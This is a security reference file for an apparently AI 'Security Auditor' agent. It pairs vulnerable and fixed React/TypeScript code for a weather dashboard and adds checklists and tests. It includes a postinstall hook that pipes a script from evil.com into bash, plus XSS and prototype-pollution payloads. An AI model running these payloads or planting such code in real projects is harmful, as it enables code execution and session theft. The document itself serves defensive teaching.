# Security Auditor — Detailed Patterns & Exploit Scenarios

This file contains security-specific patterns, vulnerability detection guides, exploit scenarios, and remediation code examples for the Security Auditor agent.

## Vulnerability Detection Patterns

### 🔴 Critical: API Key Exposure

#### ❌ VULNERABLE

```ts
// src/api/fetchWeather.ts
const API_KEY = 'a1b2c3d4e5f6g7h8i9j0'; // Hardcoded secret
const url = `https://api.openweathermap.org/data/2.5/weather?q=${city}&appid=${API_KEY}`;
```

**Attack Vector**: API key visible in source code, Git history, or bundled JavaScript  
**Impact**: Attacker can abuse API quota, rack up costs, or access data  
**Exploitability**: Trivial — view-source or check bundle

#### ✅ SECURE

```ts
// src/api/fetchWeather.ts
const API_KEY = import.meta.env.VITE_OPENWEATHER_API_KEY;
if (!API_KEY) {
  throw new ApiKeyError('VITE_OPENWEATHER_API_KEY not configured');
}

// .env.example (committed)
VITE_OPENWEATHER_API_KEY = your_api_key_here;

// .env (gitignored)
VITE_OPENWEATHER_API_KEY = a1b2c3d4e5f6g7h8i9j0;
```

**Fix Checklist**:

- [ ] Move secret to `.env` file
- [ ] Add `.env` to `.gitignore`
- [ ] Provide `.env.example` with placeholder values
- [ ] Validate presence with runtime check
- [ ] Rotate exposed key immediately
- [ ] Search Git history: `git log -p -S "api_key"` and rewrite if found

---

### 🔴 Critical: XSS via dangerouslySetInnerHTML

#### ❌ VULNERABLE

```tsx
// src/components/WeatherCard.tsx
interface Props {
  description: string; // User-controlled from API
}

export function WeatherCard({ description }: Props) {
  // XSS if description contains: <img src=x onerror=alert(document.cookie)>
  return <div dangerouslySetInnerHTML={{ __html: description }} />;
}
```

**Attack Vector**: Malicious API response or MITM attack injects script  
**Impact**: Session hijacking, credential theft, malware injection  
**Exploitability**: Moderate — requires API compromise or network access

#### ✅ SECURE

```tsx
// src/components/WeatherCard.tsx
export function WeatherCard({ description }: Props) {
  // React escapes by default — no dangerouslySetInnerHTML needed
  return <div>{description}</div>;
}

// If HTML is truly needed:
import DOMPurify from 'dompurify';

export function WeatherCard({ description }: Props) {
  const sanitized = DOMPurify.sanitize(description, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong'],
    ALLOWED_ATTR: [],
  });
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}
```

---

### 🔴 Critical: XSS via href Attribute

#### ❌ VULNERABLE

```tsx
// src/components/CityLink.tsx
interface Props {
  url: string; // User input or API data
}

export function CityLink({ url }: Props) {
  // XSS if url is: javascript:alert(document.cookie)
  return <a href={url}>View City</a>;
}
```

**Attack Vector**: `javascript:` protocol injection in href  
**Impact**: Code execution when user clicks link  
**Exploitability**: Trivial — just needs malicious input

#### ✅ SECURE

```tsx
// src/components/CityLink.tsx
function isSafeUrl(url: string): boolean {
  try {
    const parsed = new URL(url, window.location.origin);
    return ['http:', 'https:'].includes(parsed.protocol);
  } catch {
    return false;
  }
}

export function CityLink({ url }: Props) {
  if (!isSafeUrl(url)) {
    return <span>Invalid URL</span>;
  }
  return (
    <a href={url} rel="noopener noreferrer">
      View City
    </a>
  );
}
```

---

### 🔴 Critical: Sensitive Data in localStorage

#### ❌ VULNERABLE

```ts
// src/hooks/useAuth.ts
function login(username: string, password: string) {
  const response = await fetch('/api/login', {
    method: 'POST',
    body: JSON.stringify({ username, password }),
  });
  const { token } = await response.json();

  // XSS can steal this token via document.cookie or localStorage access
  localStorage.setItem('authToken', token);
  localStorage.setItem('userPassword', password); // NEVER store passwords
}
```

**Attack Vector**: XSS reads localStorage, steals auth token  
**Impact**: Account takeover, impersonation  
**Exploitability**: Trivial if XSS exists anywhere in app

#### ✅ SECURE

```ts
// src/hooks/useAuth.ts
function login(username: string, password: string) {
  const response = await fetch('/api/login', {
    method: 'POST',
    credentials: 'include', // Use HttpOnly cookies
    body: JSON.stringify({ username, password }),
  });

  // Backend sets HttpOnly cookie — not accessible to JavaScript
  // No localStorage for auth tokens
}

// For non-sensitive data only:
// src/hooks/useFavorites.ts
function addFavorite(city: string) {
  const favorites = JSON.parse(localStorage.getItem('favorites') ?? '[]');
  localStorage.setItem('favorites', JSON.stringify([...favorites, city]));
}
```

**localStorage Safe Use Cases**:

- ✅ UI preferences (theme, language)
- ✅ Non-sensitive user data (favorite cities, history)
- ❌ Auth tokens, passwords, PII, API keys

---

### 🟠 High: Server-Side Request Forgery (SSRF)

#### ❌ VULNERABLE

```ts
// src/api/fetchWeather.ts
export async function fetchWeather(city: string) {
  // User controls city → could inject URL to internal services
  // Example: city = "../../../admin/secrets"
  const url = `${baseUrl}/weather?q=${city}`;
  return fetch(url);
}
```

**Attack Vector**: User inputs `../../internal-api/secrets` as city name  
**Impact**: Access internal services, port scanning, data exfiltration  
**Exploitability**: Moderate — depends on API design

#### ✅ SECURE

```ts
// src/api/fetchWeather.ts
function validateCityName(city: string): void {
  // Only alphanumeric, spaces, hyphens
  if (!/^[a-zA-Z\s-]{1,100}$/.test(city)) {
    throw new ValidationError('Invalid city name format');
  }

  // Block path traversal
  if (city.includes('..') || city.includes('/') || city.includes('\\')) {
    throw new ValidationError('Invalid characters in city name');
  }
}

export async function fetchWeather(city: string) {
  validateCityName(city);

  // Use URL constructor for proper encoding
  const url = new URL('/data/2.5/weather', baseUrl);
  url.searchParams.set('q', city); // Auto-encodes
  url.searchParams.set('appid', apiKey);

  return fetch(url.toString());
}
```

---

### 🟠 High: Unvalidated API Responses

#### ❌ VULNERABLE

```ts
// src/api/weatherParser.ts
export function parseWeather(data: any): Weather {
  // Assumes API response shape — crashes if unexpected
  return {
    name: data.name,
    temp: data.main.temp,
    description: data.weather[0].description,
  };
}
```

**Attack Vector**: MITM or compromised API sends malicious data  
**Impact**: TypeError crashes, prototype pollution, unexpected behavior  
**Exploitability**: Moderate — requires API compromise

#### ✅ SECURE

```ts
// src/api/weatherParser.ts
function isObject(value: unknown): value is Record<string, unknown> {
  return typeof value === 'object' && value !== null && !Array.isArray(value);
}

function getString(obj: Record<string, unknown>, key: string): string {
  const value = obj[key];
  if (typeof value !== 'string') {
    throw new ParseError(`${key}: expected string, got ${typeof value}`);
  }
  return value;
}

function getNumber(obj: Record<string, unknown>, key: string): number {
  const value = obj[key];
  if (typeof value !== 'number' || Number.isNaN(value)) {
    throw new ParseError(`${key}: expected number, got ${typeof value}`);
  }
  return value;
}

export function parseWeather(data: unknown): Weather {
  if (!isObject(data)) {
    throw new ParseError('Response must be an object');
  }

  const name = getString(data, 'name');

  const main = data.main;
  if (!isObject(main)) {
    throw new ParseError('main: expected object');
  }
  const temp = getNumber(main, 'temp');

  const weather = data.weather;
  if (!Array.isArray(weather) || weather.length === 0) {
    throw new ParseError('weather: expected non-empty array');
  }
  if (!isObject(weather[0])) {
    throw new ParseError('weather[0]: expected object');
  }
  const description = getString(weather[0], 'description');

  return { name, temp, description };
}
```

---

### 🟠 High: Missing Rate Limiting / DoS

#### ❌ VULNERABLE

```tsx
// src/components/CitySearch.tsx
export function CitySearch() {
  const [city, setCity] = useState('');

  // Fires API request on EVERY keystroke
  const { data } = useQuery({
    queryKey: ['weather', city],
    queryFn: () => fetchWeather(city),
  });

  return <input value={city} onChange={(e) => setCity(e.target.value)} />;
}
```

**Attack Vector**: User types rapidly → 100s of requests → quota exhaustion  
**Impact**: DoS, API cost spike, quota lockout  
**Exploitability**: Trivial — just type quickly

#### ✅ SECURE

```tsx
// src/components/CitySearch.tsx
import { useDeferredValue } from 'react';

export function CitySearch() {
  const [city, setCity] = useState('');
  const deferredCity = useDeferredValue(city);

  // Only fires when user stops typing (debounced)
  const { data } = useQuery({
    queryKey: ['weather', deferredCity],
    queryFn: () => fetchWeather(deferredCity),
    enabled: deferredCity.length > 0, // Don't fire on empty
  });

  return <input value={city} onChange={(e) => setCity(e.target.value)} />;
}

// Alternative: use lodash debounce
import { debounce } from 'lodash-es';

const debouncedSearch = useMemo(
  () => debounce((value: string) => setDebouncedCity(value), 500),
  [],
);
```

---

### 🟡 Medium: Information Disclosure via Error Messages

#### ❌ VULNERABLE

```ts
// src/api/fetchWeather.ts
export async function fetchWeather(city: string) {
  try {
    const response = await fetch(url);
    return response.json();
  } catch (err) {
    // Leaks internal paths, stack traces, API URLs
    console.error('Failed to fetch weather:', err);
    throw new Error(`API error: ${err.message} at ${err.stack}`);
  }
}
```

**Attack Vector**: Error messages reveal system internals  
**Impact**: Information gathering for further attacks  
**Exploitability**: Trivial — trigger errors and read console

#### ✅ SECURE

```ts
// src/api/fetchWeather.ts
export async function fetchWeather(city: string) {
  try {
    const response = await fetch(url);

    if (!response.ok) {
      // Generic user-facing message
      if (response.status === 404) {
        throw new CityNotFoundError(city);
      }
      throw new ServerError(response.status);
    }

    return response.json();
  } catch (err) {
    // Log full details server-side only (if backend exists)
    // Client gets sanitized message
    if (err instanceof WeatherApiError) {
      throw err;
    }
    throw new ServerError(500, 'An unexpected error occurred');
  }
}

// In production, disable verbose console logs
if (import.meta.env.PROD) {
  console.log = () => {};
  console.debug = () => {};
  // Keep console.error for critical issues only
}
```

---

### 🟡 Medium: Prototype Pollution

#### ❌ VULNERABLE

```ts
// src/utils/merge.ts
function merge(target: any, source: any): any {
  for (const key in source) {
    if (typeof source[key] === 'object') {
      target[key] = merge(target[key] || {}, source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// Attack: merge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'))
// Now all objects have isAdmin: true
```

**Attack Vector**: Malicious JSON with `__proto__` or `constructor` keys  
**Impact**: Privilege escalation, security bypass  
**Exploitability**: Moderate — requires JSON parsing of untrusted data

#### ✅ SECURE

```ts
// src/utils/merge.ts
function merge(target: object, source: object): object {
  for (const key in source) {
    // Block dangerous keys
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
      continue;
    }

    if (Object.prototype.hasOwnProperty.call(source, key)) {
      const value = source[key as keyof typeof source];
      if (typeof value === 'object' && value !== null) {
        target[key as keyof typeof target] = merge(
          target[key as keyof typeof target] || {},
          value,
        );
      } else {
        target[key as keyof typeof target] = value;
      }
    }
  }
  return target;
}

// Better: use structuredClone or Object.assign
const merged = { ...target, ...source };
```

---

## Project-Specific Security Checks

### Weather Dashboard Attack Surface

**Entry Points** (user input):

1. City search input → `CitySearch.tsx`
2. URL parameters → `CityPage.tsx` (`:name` route param)
3. localStorage favorites → `useFavorites.ts`

**Sensitive Data**:

1. API key → `import.meta.env.VITE_OPENWEATHER_API_KEY`
2. API responses → must pass through parser
3. No auth tokens (this app doesn't use authentication)

**External Dependencies**:

1. OpenWeatherMap API → verify HTTPS only
2. npm packages → check for CVEs

### Checklist by File Type

#### `src/api/**` Files

- [ ] API keys read from environment, never hardcoded
- [ ] All fetch URLs use HTTPS (no `http://`)
- [ ] User input validated before including in URLs
- [ ] Responses treated as `unknown` and validated
- [ ] Error messages don't leak API keys or internal paths
- [ ] API key masked in logs: `maskApiKey(key)`

#### `src/components/**` Files

- [ ] No `dangerouslySetInnerHTML` without DOMPurify
- [ ] No `href={userInput}` without URL validation
- [ ] No sensitive data in component state
- [ ] localStorage only used for non-sensitive data
- [ ] No inline `style={{}}` with user-controlled values

#### `src/hooks/**` Files

- [ ] `useFavorites` → localStorage access limited to city names
- [ ] `useTheme` → safe to store in localStorage
- [ ] `useWeather` → API key not exposed in query keys
- [ ] No auth tokens in custom hooks (this app has none)

#### `src/mocks/**` Files

- [ ] Mock data doesn't contain real API keys
- [ ] Test fixtures don't expose production URLs
- [ ] MSW handlers return sanitized data only
- [ ] Mocks not included in production bundle (check `vite.config.ts`)

---

## Dependency Security

### NPM Audit Automation

```bash
# Check for known vulnerabilities
npm audit

# Fix automatically (may break things)
npm audit fix

# Check without installing
npm audit --audit-level=moderate
```

### Common Vulnerable Packages (Weather Dashboard Context)

**Direct Dependencies to Audit**:

- `react`, `react-dom` → check for CVE-2023-\* (XSS in legacy versions)
- `@tanstack/react-query` → check for prototype pollution
- `react-router-dom` → check for open redirect vulnerabilities

**Development Dependencies** (lower risk but still check):

- `vite` → check for dev server vulnerabilities
- `vitest`, `@testing-library/*` → not in production bundle

### package.json Script Security

#### ❌ VULNERABLE

```json
{
  "scripts": {
    "postinstall": "curl https://evil.com/steal.sh | bash"
  }
}
```

**Attack Vector**: Malicious dependency runs script on `npm install`  
**Impact**: Code execution, credential theft  
**Exploitability**: Trivial — happens automatically

#### ✅ SECURE

```json
{
  "scripts": {
    "dev": "vite",
    "build": "tsc && vite build",
    "test": "vitest",
    "lint": "eslint ."
  }
}
```

**Audit Checklist**:

- [ ] No `postinstall`, `preinstall`, `install` scripts from dependencies
- [ ] All scripts are known and expected
- [ ] No scripts downloading files from the internet
- [ ] Use `npm ci` instead of `npm install` in CI/CD

---

## Exploit Scenario Templates

### Template 1: XSS Attack

**File**: `src/components/WeatherCard.tsx`  
**Vulnerability**: Unsanitized API response rendered

**Exploit Steps**:

1. Attacker performs MITM attack or compromises API
2. API returns: `{ description: "<img src=x onerror=alert(document.cookie)>" }`
3. Component renders description without sanitization
4. Script executes, stealing session cookies
5. Attacker hijacks user session

**Fix**: Rely on React's auto-escaping or use DOMPurify

---

### Template 2: API Key Theft

**File**: `src/api/fetchWeather.ts`  
**Vulnerability**: API key hardcoded in source

**Exploit Steps**:

1. Attacker views page source or checks bundled JS
2. Searches for `api.openweathermap.org` or `appid=`
3. Extracts API key from source code
4. Uses key to make unlimited API requests
5. Exhausts quota or racks up costs

**Fix**: Move to environment variable, rotate key, add rate limiting

---

## OWASP References

| Category                       | OWASP Link                                                                                | Weather Dashboard Relevance              |
| ------------------------------ | ----------------------------------------------------------------------------------------- | ---------------------------------------- |
| A01: Broken Access Control     | [OWASP A01](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)                      | No auth in this app — low risk           |
| A02: Cryptographic Failures    | [OWASP A02](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/)                     | API key exposure — HIGH RISK             |
| A03: Injection                 | [OWASP A03](https://owasp.org/Top10/A03_2021-Injection/)                                  | XSS in components — HIGH RISK            |
| A04: Insecure Design           | [OWASP A04](https://owasp.org/Top10/A04_2021-Insecure_Design/)                            | Rate limiting — MEDIUM RISK              |
| A05: Security Misconfiguration | [OWASP A05](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)                  | Dev code in prod — MEDIUM RISK           |
| A06: Vulnerable Components     | [OWASP A06](https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/)         | npm audit — MEDIUM RISK                  |
| A07: Auth Failures             | [OWASP A07](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/) | No auth — N/A                            |
| A08: Data Integrity            | [OWASP A08](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)       | API response validation — HIGH RISK      |
| A09: Logging Failures          | [OWASP A09](https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/)   | Error message leaks — LOW RISK           |
| A10: SSRF                      | [OWASP A10](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/)     | User-controlled city param — MEDIUM RISK |

---

## Security Testing Patterns

### Manual Security Test Cases

```ts
// tests/security/xss.test.ts
describe('XSS Prevention', () => {
  it('escapes malicious city names', () => {
    const malicious = '<script>alert("XSS")</script>';
    render(<WeatherCard city={malicious} />);

    // Should render as text, not execute
    expect(screen.getByText(/script/i)).toBeInTheDocument();
    expect(document.querySelector('script')).toBeNull();
  });

  it('sanitizes API responses', () => {
    const maliciousResponse = {
      name: 'London',
      weather: [{ description: '<img src=x onerror=alert(1)>' }],
    };

    const parsed = parseWeather(maliciousResponse);
    render(<WeatherCard weather={parsed} />);

    // Should not create img element
    expect(screen.queryByRole('img')).not.toBeInTheDocument();
  });
});

// tests/security/api-key.test.ts
describe('API Key Security', () => {
  it('does not expose API key in query params', () => {
    const { result } = renderHook(() => useWeather('London'));

    // Query key should not contain raw API key
    const queryKey = result.current.queryKey;
    expect(JSON.stringify(queryKey)).not.toMatch(/[a-f0-9]{32}/);
  });

  it('masks API key in error messages', async () => {
    const consoleSpy = vi.spyOn(console, 'error').mockImplementation(() => {});

    await expect(fetchWeather('Invalid')).rejects.toThrow();

    // Check that API key is not in console output
    const logs = consoleSpy.mock.calls.flat().join(' ');
    expect(logs).not.toMatch(/appid=[a-f0-9]{32}/);

    consoleSpy.mockRestore();
  });
});
```

---

## Quick Security Scan Checklist

**Before each audit**, verify:

- [ ] Read `.env.example` — are any secrets committed?
- [ ] Check `package.json` — run `npm audit`
- [ ] Search for `dangerouslySetInnerHTML`
- [ ] Search for `eval(`, `new Function(`
- [ ] Search for `localStorage.setItem` — verify non-sensitive data only
- [ ] Check all `fetch()` calls — HTTPS only?
- [ ] Grep for common secret patterns: `apikey`, `password`, `secret`, `token`
- [ ] Review all user input entry points (search, URL params)
- [ ] Check error messages — do they leak internals?
- [ ] Verify dependencies are up to date: `npm outdated`
